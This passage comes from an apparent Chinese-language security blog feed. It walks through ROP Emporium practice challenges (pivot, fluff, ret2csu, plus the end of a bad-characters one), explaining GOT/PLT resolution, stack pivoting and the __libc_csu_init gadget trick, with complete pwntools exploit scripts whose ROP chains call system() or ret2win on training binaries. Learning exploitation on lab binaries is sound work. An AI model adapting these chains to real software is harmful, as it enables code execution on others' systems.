class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">place_string_at_address</span>(<span class="params">mov_gadget_address, pop_gadget_address, string_address, string</span>):  </span><br><span class="line">     <span class="keyword">while</span> <span class="built_in">len</span>(string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">          string += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">        </span><br><span class="line">     splitted_string = [string[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string), <span class="number">8</span>)]</span><br><span class="line">     payload = <span class="string">&quot;&quot;</span></span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(splitted_string)):</span><br><span class="line">          <span class="comment"># Place the gadgets into the payload.</span></span><br><span class="line">          payload += p64(pop_gadget_address)</span><br><span class="line">          payload += splitted_string[i]</span><br><span class="line">          payload += p64(string_address + (i * <span class="number">8</span>)) </span><br><span class="line">          payload += p64(mov_gadget_address)</span><br><span class="line">            </span><br><span class="line">      <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">offset = <span class="string">&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">offset += place_string_at_address(<span class="number">0x400b34</span>, <span class="number">0x400b3b</span>, <span class="number">0x601071</span>, <span class="string">&quot;aat!alag.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now we&#x27;re XORing values from string.</span></span><br><span class="line"><span class="comment"># 2 ^ &#x27;a&#x27; = &#x27;c&#x27; </span></span><br><span class="line">offset += p64(<span class="number">0x0000000000400b40</span>)<span class="comment"># pop r14; pop r15; ret</span></span><br><span class="line">offset += p64(<span class="number">0x2</span>)</span><br><span class="line">offset += p64(<span class="number">0x601071</span>)<span class="comment"># 字符位置</span></span><br><span class="line">offset += p64(<span class="number">0x0000000000400b30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 ^ &#x27;!&#x27; = &#x27; &#x27;</span></span><br><span class="line"><span class="comment"># String address is 0x601071 because if we would have 0x601070</span></span><br><span class="line"><span class="comment"># address of second XORed character would end with 0x73, which</span></span><br><span class="line"><span class="comment"># is restricted.</span></span><br><span class="line">offset += p64(<span class="number">0x0000000000400b40</span>)</span><br><span class="line">offset += p64(<span class="number">0x1</span>)</span><br><span class="line">offset += p64(<span class="number">0x601074</span>)</span><br><span class="line">offset += p64(<span class="number">0x0000000000400b30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 ^ &#x27;a&#x27; = &#x27;f&#x27;</span></span><br><span class="line">offset += p64(<span class="number">0x0000000000400b40</span>)</span><br><span class="line">offset += p64(<span class="number">0x7</span>)</span><br><span class="line">offset += p64(<span class="number">0x601075</span>)</span><br><span class="line">offset += p64(<span class="number">0x0000000000400b30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Pop address of string into RDI and call system()</span></span><br><span class="line">offset += p64(<span class="number">0x0000000000400b39</span>)<span class="comment"># pop rdi; ret</span></span><br><span class="line">offset += p64(<span class="number">0x601071</span>)</span><br><span class="line">offset += p64(<span class="number">0x004009e8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(offset)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240211005709606.png" alt="image-20240211005709606"></p><h1 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h1><h2 id="Got表和PLT表"><a href="#Got表和PLT表" class="headerlink" title="Got表和PLT表"></a>Got表和PLT表</h2><p>操作系统通常使用动态链接的方法来提高程序运行的效率。在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。这样的设计就能提高程序运行的流畅度，也减少了内存空间。而且现代操作系统不允许修改代码段，只能修改数据段，那么GOT表与PLT表就应运而生。</p><p><img src="/.io//v2-6e9fb0ce3601c12321b123a02db4f352_r.jpg" alt="img"></p><p>当函数第一次被用到时才进行绑定(符号査找、重定位等),如果没有用到则不进行绑定。</p><p>为了提到cpude效率，在程序加载时并不会解析所有函数，而是在某个函数被调用时通过plt和got来对函数解析，然后将获得的函数地址放在got中，下一次调用就会直接使用got中的函数地址来对函数进行调用。</p><p><a href="https://blog.csdn.net/farmwang/article/details/73556017">GOT与PLT_got.plt-CSDN博客</a></p><h2 id="pivot-1"><a href="#pivot-1" class="headerlink" title="pivot"></a>pivot</h2><p>首先看一下基本信息</p><p>   rabin2 -I pivot</p><p><img src="/.io//image-20240211012551177.png" alt="image-20240211012551177"></p><p>   r2 -AAA .&#x2F;pivot；afl</p><p><img src="/.io//image-20240211012633326.png" alt="image-20240211012633326"></p><p>   先看看pwnme</p><p>   pdf @ sym.pwnme</p><p><img src="/.io//image-20240211012731487.png" alt="image-20240211012731487"></p><p>在上图中可以看到我们的exp应该需要两个chain</p><p>   同时告诉我们从libpivot.so调用了ret2win()</p><p>   再来看看uselessFunction  </p><p>   pdf @ sym.uselessFunction</p><p><img src="/.io//image-20240211012759516.png" alt="image-20240211012759516"></p><p>可以看到调用了foothold_function,但是其自身没有被调用</p><p>   接下来看看libpivot.so</p><p>   r2 -AAA libpivot.so；afl</p><p><img src="/.io//image-20240211012852356.png" alt="image-20240211012852356"></p><p> pdf @sym.ret2win</p><p><img src="/.io//image-20240211012925603.png" alt="image-20240211012925603"></p><p> 可以看到ret2win会打印flag</p><p>从题目的说明中</p><p><img src="/.io//image-20240211012945794.png" alt="image-20240211012945794"></p><p>我们知道栈空间被限制了，但是我们具体可以放多少空间呢?</p><p>使用gdb进行分析</p><p>gdb .&#x2F;pivot 输入r运行，然后第一次输入a，第二次输入一串A</p><p><img src="/.io//image-20240211013143258.png" alt="image-20240211013143258"></p><p>看一下rsp的情况</p><p><img src="/.io//image-20240211013251475.png" alt="image-20240211013251475"></p><p> 可以看到一共是3个qword，即3个八字节</p><p>   我们的任务就是通过这些空间，以某种方式把我们的空间pivot到一个更大的空间</p><p>   我们注意到，在运行的时候，程序会打印出一个缓冲区的地址，这就是第一个fgets使用的。我们可以改变指向那个缓冲区的rsp寄存器的值，这个值将是我们ROPchain的第二段</p><p>   我们先ropgadget看看可用的gadget</p><p>   ROPgadget –binary pivot</p><p><img src="/.io//image-20240211013426327.png" alt="image-20240211013426327"></p><p>我们可以使用pop rax,ret，然后将缓冲区的地址放在第二个位置上，最后xchg rax,rsp,交换值</p><p>这是第一段rop chain</p><p>接下来我们要解决的是由于ASLR机制，我们该如何得到ret2win函数的地址</p><p>由于plt表与got表的特性，函数第一次调用时plt表指向的got表中存储的执行在plt表中查找函数真实地址的函数地址，查找到函数真实地址后，存储到got表的原来表项中替换掉查找函数的指向地址。以题目为例， foothold_function函数，先调用利用利用plt表中的地址调用一次后，在plot表中会存储其真实地址，利用foothold_function函数与ret2win函数在libpivot32.so的便宜差，通过foothold_function真实地址，计算出ret2win函数的真实地址。</p><p>我们可以在pivot32的二进制找到foothold_function的plt和got表项，还可以在libpivot32.so找到ret2win这个函数。</p><p>因此解决办法是计算相对于foothold_function的偏移，然后在第二段中加上计算出来的值就可以了</p><p>回到r2分析libpivot.so分析时得到的地址</p><p><img src="/.io//image-20240211013552758.png" alt="image-20240211013552758"></p><p> 计算偏移为0x14e</p><p>然后我们要知道foothold_function在plt,got中的偏移</p><p>r2 -AAA .&#x2F;pivot</p><p><img src="/.io//image-20240211013656302.png" alt="image-20240211013656302"></p><p>ir</p><p><img src="/.io//image-20240211013719380.png" alt="image-20240211013719380"></p><p>地址是0x602048</p><p>这样写第二段ropchain的准备工作也完成了</p><p>关键部分在于：</p><p>   首先调用foothold_function来填充.got.plt</p><p>   pop foothold_function的got到rax寄存器</p><p>   向rax中添加偏移得到ret2win的</p><p>   最后进行调用即可</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gadgets</span></span><br><span class="line"></span><br><span class="line">pop_rax             = p64(<span class="number">0x0000000000400b00</span>)</span><br><span class="line">xchg_rax_rsp        = p64(<span class="number">0x0000000000400b02</span>)</span><br><span class="line">mov_rax_mrax        = p64(<span class="number">0x0000000000400b05</span>)</span><br><span class="line">pop_rbp             = p64(<span class="number">0x0000000000400900</span>)</span><br><span class="line">add_rax_rbp         = p64(<span class="number">0x0000000000400b09</span>)</span><br><span class="line">call_rax            = p64(<span class="number">0x000000000040098e</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line"></span><br><span class="line">foothold_plt        = p64(<span class="number">0x00400850</span>)</span><br><span class="line">foothold_got        = p64(<span class="number">0x00602048</span>)</span><br><span class="line"></span><br><span class="line">pivot = process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">heap_address = <span class="built_in">int</span>(pivot.recvline_contains(<span class="string">&#x27;The Old Gods kindly bestow upon you a place to pivot:&#x27;</span>).decode(<span class="string">&#x27;UTF-8&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_address))</span><br><span class="line"></span><br><span class="line">heap_address = p64(heap_address)</span><br><span class="line"></span><br><span class="line">pid = util.proc.pidof(pivot)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] PID = &quot;</span> + <span class="built_in">str</span>(pid))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment this if you want to use the debugger</span></span><br><span class="line"><span class="comment">#util.proc.wait_for_debugger(pid)</span></span><br><span class="line"></span><br><span class="line">second_stage = <span class="string">b&quot;&quot;</span></span><br><span class="line">second_stage += foothold_plt<span class="comment"># 调用foothold_function函数，调用时会将foothold_function函数的实际地址写入到GOT表中</span></span><br><span class="line">second_stage += pop_rax</span><br><span class="line">second_stage += foothold_got<span class="comment"># 将foothold_function函数的GOT地址写入eax寄存器</span></span><br><span class="line">second_stage += mov_rax_mrax<span class="comment"># 将foothold_function函数的GOT地址指向的地址放入eax寄存器，即foothold_function函数在内存中的真实地址</span></span><br><span class="line">second_stage += pop_rbp</span><br><span class="line">second_stage += p64(<span class="number">0x14e</span>)<span class="comment"># 将ret2win函数与foothold_function函数在libc.so文件中的相对偏移放入rbp</span></span><br><span class="line">second_stage += add_rax_rbp<span class="comment"># foothold_function函数真实地址加上ret2win相对于foothold_function函数的offset即得ret2win函数在内存中的实际地址</span></span><br><span class="line">second_stage += call_rax<span class="comment"># 使程序跳转到eax中的地址，即泄露的堆空间的入口位置</span></span><br><span class="line"></span><br><span class="line">pivot.recvuntil(<span class="string">&quot;Send your second chain now and it will land there&quot;</span>)</span><br><span class="line">pivot.sendline(second_stage)</span><br><span class="line"></span><br><span class="line">first_stage = <span class="string">b&quot;A&quot;</span> * <span class="number">40</span></span><br><span class="line">first_stage += pop_rax</span><br><span class="line">first_stage += heap_address<span class="comment"># 堆空间的地址放入rax寄存器</span></span><br><span class="line">first_stage += xchg_rax_rsp<span class="comment"># 交换eax和esp的值，也就是说程序分配的对空间就被当成栈，交换eax和esp的值，也就是说程序分配的堆空间就被当成栈，ret就会返回到栈顶去执行我们精心设计好的shellcode</span></span><br><span class="line"></span><br><span class="line">pivot.recvuntil(<span class="string">&quot;Now kindly send your stack smash&quot;</span>)</span><br><span class="line">pivot.sendline(first_stage)</span><br><span class="line"></span><br><span class="line">output = pivot.recvall()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><h1 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h1><p> 先看一下基本信息</p><p>rabin2 -I fluff</p><p><img src="/.io//image-20240211153816683.png" alt="image-20240211153816683"></p><p>   然后载入r2分析</p><p>   r2 -AAA .&#x2F;fluff;afl</p><p><img src="/.io//image-20240211153910017.png" alt="image-20240211153910017"></p><p>分别看看pwnme和usefulFunction</p><p>   pdf @ sym.pwnme</p><p><img src="/.io//image-20240211153959924.png" alt="image-20240211153959924"></p><p>pdf @ sym.usefulFunction</p><p><img src="/.io//image-20240211154028720.png" alt="image-20240211154028720"></p><p>重复gdb调试过程，可以发现，esp偏移还是40。</p><p><img src="/.io//image-20240211154312428.png" alt="image-20240211154312428"></p><p> 然后使用ropgadget找到有用的gadget</p><p>   ROPgadget –binary fluff     </p><p>首先我们要找到一个gadget用于将字符串写入内存。mov适合的似乎只有下面这一条mov适合的似乎只有下面这一条</p><p><img src="/.io//image-20240211161130385.png" alt="image-20240211161130385"></p><p>如果用了这一条，那么下一个要解决的问题就是怎么将值写入r10、r11寄存器呢</p><p>似乎没有可直接写的办法，这时候我们常用的解决办法就是组合多个gadget以将值写入r10为例，我们看看该如何操作</p><p>那么这里就需要注意了，按照前面的默认命令，其实ropgadget的搜索深度是10。既然我们需要组合多个gadget，既然越多越多，所以我们可以加上–depth 20，将深度设为20</p><p>ROPgadget –binary fluff –depth 20</p><p>首先清空r11，有两个办法，要么置零，要么与自身异或</p><p>我们看看gadget里有没有符合的</p><p><img src="/.io//image-20240211161354176.png" alt="image-20240211161354176"></p><p>接下来把地址pop到r12里</p><p>对应的gadget为</p><p><img src="/.io//image-20240211161458563.png" alt="image-20240211161458563"></p><p>前面r11已经是0了，我们将r12与r11异或，这样其实就相当于间接地使用了mov，将值写入了r11</p><p><img src="/.io//image-20240211161618176.png" alt="image-20240211161618176"></p><p>然后使用xchg交换r11和r10寄存器的值，这样就相当于将地址写到了r10寄存器中</p><p><img src="/.io//image-20240211161740267.png" alt="image-20240211161740267"></p><p>做完这部分工作之后，我们只需pop rdi,ret，字符串的地址作为system（）参数传入，再调用system（）就可以了</p><p><img src="/.io//image-20240211161821012.png" alt="image-20240211161821012"></p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">place_address</span>(<span class="params">address</span>):</span><br><span class="line">    payload = p64(<span class="number">0x0000000000400822</span>) <span class="comment"># xor r11, r11; pop r14; mov edi, 0x601050; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># Unused pop r14</span></span><br><span class="line">    payload += p64(<span class="number">0x0000000000400832</span>) <span class="comment"># pop r12; mov r13d, 0x604060; ret;</span></span><br><span class="line">    payload += p64(address)</span><br><span class="line">    payload += p64(<span class="number">0x000000000040082f</span>) <span class="comment"># xor r11, r12; pop r12; mov r13d, 0x604060; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># Unused pop r12</span></span><br><span class="line">    payload += p64(<span class="number">0x0000000000400840</span>) <span class="comment"># xchg r11, r10; pop r15; mov r11d, 0x602050; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># Unused pop r15</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">place_data</span>(<span class="params">data</span>):</span><br><span class="line">    payload = p64(<span class="number">0x0000000000400822</span>) <span class="comment"># xor r11, r11; pop r14; mov edi, 0x601050; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># Unused pop r14</span></span><br><span class="line">    payload += p64(<span class="number">0x0000000000400832</span>) <span class="comment"># pop r12; mov r13d, 0x604060; ret;</span></span><br><span class="line">    payload += data <span class="comment"># String to be putted</span></span><br><span class="line">    payload += p64(<span class="number">0x000000000040082f</span>) <span class="comment"># xor r11, r12; pop r12; mov r13d, 0x604060; ret;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># Unused pop r12</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">string, address</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">          string += <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    splitted_string = [string[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string), <span class="number">8</span>)]</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(splitted_string)):</span><br><span class="line">        <span class="comment"># Put address into r10 register</span></span><br><span class="line">        payload += place_address(address + (i * <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Now we have to put actual data in r11</span></span><br><span class="line">        payload += place_data(splitted_string[i])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Write data to address</span></span><br><span class="line">        payload += p64(<span class="number">0x000000000040084e</span>) <span class="comment"># mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; </span></span><br><span class="line">        payload += p64(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># Unused pop r13 and pop r12</span></span><br><span class="line">         </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">offset = cyclic(<span class="number">40</span>)</span><br><span class="line">offset += write_data(<span class="string">&quot;/bin/cat flag.txt&quot;</span>, <span class="number">0x601050</span>)</span><br><span class="line">offset += p64(<span class="number">0x00000000004008c3</span>)</span><br><span class="line">offset += p64(<span class="number">0x601050</span>)</span><br><span class="line">offset += p64(<span class="number">0x00400810</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(offset)</span><br></pre></td></tr></table></figure><p>python 6.py | .&#x2F;fluff</p><p><img src="/.io//image-20240211162051959.png" alt="image-20240211162051959"></p><h1 id="Ret2csu"><a href="#Ret2csu" class="headerlink" title="Ret2csu"></a>Ret2csu</h1><p><img src="/.io//image-20240211162149382.png" alt="image-20240211162149382"></p><p>没有合适的rop gadgets,该如何在没有pop rdx的情况下写入rdx呢</p><p>   先看一下基本信息</p><p>   rabin2 -I ret2csu</p><p><img src="/.io//image-20240211162543206.png" alt="image-20240211162543206"></p><p>   载入r2</p><p>   r2 -AAA ret2csu; afl</p><p><img src="/.io//image-20240211163059328.png" alt="image-20240211163059328"></p><p>看pwnme的反汇编</p><p>pdf @ sym.pwnme</p><p><img src="/.io//image-20240211163209150.png" alt="image-20240211163209150"></p><p>可以看到要求rdx必须是指定的字符串</p><p>ret2win</p><p><img src="/.io//image-20240211163259337.png" alt="image-20240211163259337"></p><p>我们先看看ropgadget</p><p>ROPgadget –binary ret2csu</p><p>可以看到和rdx相关的只有</p><p>ROPgadget –binary ret2csu | grep rdx</p><p><img src="/.io//image-20240211163409566.png" alt="image-20240211163409566"></p><p>没有pop rdx,或mov rdx</p><p>所以理论上我们无法绕过关卡的限制，无法设置该寄存器。</p><p>此时的解决方案是returnto csu,这是blackhat2018的议题，通过一个通用的gadget来制作rop</p><p>在afl命令的输出中我们看到有一个函数，名为__libc_csu_init。x64 下的 __libc_csu_init 这个函数是用来<code>对 libc 进行初始化操作的，而一般的程序用 libc 函数，所以这个函数一定会存在。</code> (不同版本的这个函数有一定的区别)<br>简单来说就是利用libc_csu_init中的两段代码片段来实现3个参数的传递（间接性的传递参数）</p><p>我们反汇编看看</p><p>   pdf @ sym.__libc_csu_init</p><p><img src="/.io//image-20240211163535575.png" alt="image-20240211163535575"></p><p>在其中我们找到了两个gadget</p><p>   第一个：</p><p><img src="/.io//image-20240211163549013.png" alt="image-20240211163549013"></p><p>第二个：</p><p><img src="/.io//image-20240211163603005.png" alt="image-20240211163603005"></p><p><img src="/.io//image-20240211163638146.png" alt="image-20240211163638146"></p><p><img src="/.io//image-20240211163645226.png" alt="image-20240211163645226"></p><p><img src="/.io//image-20240211163652676.png" alt="image-20240211163652676"></p><p> rdi是第一个参数，rsi是第二个参数，rdx是第三个参数</p><p>   结合这两个gadget我们知道，rdi来自r13,rsi来自r14,rdx来自r15</p><p>   前面提到我们要写0xdeadcafebabebeef到rdx,而从0x00400880可以看到写入r15就可以了。通过mov rdx,r15即可实现目的。</p><p>   但是我们注意到第一个问题是第二个gadget的最后一条不是ret,而是call</p><p>   call qword ptr [r12+rbx*8]，由前可知，r12,rbx都是可控的，所以这个地址是可控的，不过为了控制目的地我们需要rbx和r12，这具体的值是什么呢?</p><p>IDA注意到</p><p><img src="/.io//image-20240211163933378.png" alt="image-20240211163933378"></p><p> 第二个gadget后面是上图的三条指令</p><p>   在cmp之前，rbx+1了，所以简单起见，我们设置rbx为0，rbp为1，这样cmp得到的结果就是相等</p><p>   后面紧接着就是add rsp,8</p><p><img src="/.io//image-20240211164015414.png" alt="image-20240211164015414"></p><p>我们知道rsp 是堆栈指针寄存器，通常会指向栈顶位置，堆栈的 pop 和push 操作就是通过改变rsp 的值即移动堆栈指针的位置来实现的。</p><p>   这里的指令相当于增加了栈空间，我们可以随意填充相应大小即可。</p><p>   在上面我们设置了rbx为0，所以call的地址就是r12指定了，但是直接把ret2win的地址放入r12会报SIGSEGV。而为了有效地使用movrdx，r15，我们必须确保调用QWORD PTR [r12 + rbx * 8]不是SIGSEGV，cmp rbx，rbp相等且最重要的是RDX的值不会改变。</p><p>   根据这篇文章（<a href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html%EF%BC%89%E6%8F%8F%E8%BF%B0%E7%9A%84%E6%8A%80%E5%B7%A7%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E8%B0%83%E7%94%A8__init()%E5%87%BD%E6%95%B0%EF%BC%8C%E9%80%9A%E8%BF%87DYNAMIC%E5%8F%98%E9%87%8F%E5%AE%9A%E4%BD%8D">https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html）描述的技巧，我们可以尝试调用__init()函数，通过DYNAMIC变量定位</a></p><p>   gdb ret2csu</p><p><img src="/.io//image-20240211164158953.png" alt="image-20240211164158953"></p><p> 因为__init使用0x400560地址，我们的指针就是0x600e30 + 8</p><p>这些操作完成后，我们就可以正常地在栈上放入ret2win的地址</p><p>   总结下我们做了哪些事情：</p><p>   首先调用第一个gadget，地址是0x40089a</p><p>   将需要的值放在栈上</p><p>   r12寄存器上是指向__init地址的指针</p><p>   r15寄存器是0xdeadcafebabebeef</p><p>   rbx寄存器是0x0</p><p>   rbp寄存器是0x1</p><p>   第二个gadget地址是0x400880</p><p>   因为有add rsp,8所以我们需要进行一些填充</p><p>   将ret2win的值放在栈上</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ret2win_adr         = <span class="number">0x4007b1</span></span><br><span class="line">first_gadget_adr    = <span class="number">0x40089a</span></span><br><span class="line">second_gadget_adr   = <span class="number">0x400880</span></span><br><span class="line">init_pointer        = <span class="number">0x600e38</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>  * <span class="number">40</span></span><br><span class="line">payload += p64(first_gadget_adr)</span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># pop rbx</span></span><br><span class="line">payload += p64(<span class="number">0x01</span>)            <span class="comment"># pop rbp</span></span><br><span class="line">payload += p64(init_pointer)    <span class="comment"># pop r12</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># pop r13</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># pop r14</span></span><br><span class="line">payload += p64(<span class="number">0xdeadcafebabebeef</span>) <span class="comment"># pop r15</span></span><br><span class="line">payload += p64(second_gadget_adr)</span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># add rsp,0x8 padding</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># r13</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># r14</span></span><br><span class="line">payload += p64(<span class="number">0x00</span>)            <span class="comment"># r15</span></span><br><span class="line">payload += p64(ret2win_adr)</span><br><span class="line"></span><br><span class="line">ret2csu = process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret2csu.readuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2csu.sendline(payload)</span><br><span class="line"></span><br><span class="line">output = ret2csu.readall()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ROP实战&quot;&gt;&lt;a href=&quot;#ROP实战&quot; class=&quot;headerlink&quot; title=&quot;ROP实战&quot;&gt;&lt;/a&gt;ROP实战&lt;/h1&gt;&lt;p&gt;ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以</summary>
      
    
    
    
    <category term="PWN" scheme="https://qianmuoy.github.io/categories/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>Radare入门</title>
    <link href="https://qianmuoy.github.io/2024/03/01/Radare%E5%85%A5%E9%97%A8/"/>
    <id>https://qianmuoy.github.io/2024/03/01/Radare%E5%85%A5%E9%97%A8/</id>
    <published>2024-03-01T08:43:19.000Z</published>
    <updated>2024-03-01T08:44:19.016Z</updated>
    
